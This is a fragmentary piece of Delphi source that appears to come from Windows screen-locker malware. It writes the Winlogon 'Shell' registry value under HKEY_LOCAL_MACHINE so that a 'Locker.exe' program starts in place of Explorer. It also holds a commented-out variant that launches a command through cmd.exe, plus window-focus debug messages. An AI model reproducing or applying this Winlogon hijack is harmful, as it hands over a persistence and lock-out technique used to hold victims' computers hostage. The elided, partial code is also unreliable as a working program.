...
begin
  ...
  reg.RootKey := HKEY_LOCAL_MACHINE;
  reg.OpenKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',True);
  reg.WriteString('Userinit','Explorer.exe');
  reg.Free;}
  ...
  //-----------------------MAIN
  //reg.WriteString('Shell',PChar('cmd.exe /c start "" "'+paramBlock+'""'));
  reg.WriteString('Shell',PChar('"'+programPath+'\Locker.exe"'));
  //---------------------------------------------------------------------//
  reg.Free;}
...
begin
  ...
  {Self.Hide;
  Self.Show;}
  ShowMessage('Focused get - '+IntToStr(Windows.GetFocus));
  {ShowMessage('Active - '+IntToStr(GetActiveWindow)+#13#10
            +'Application - '+IntToStr(Application.Handle)+#13#10
            +'Self - '+IntToStr(Self.Handle)+#13#10
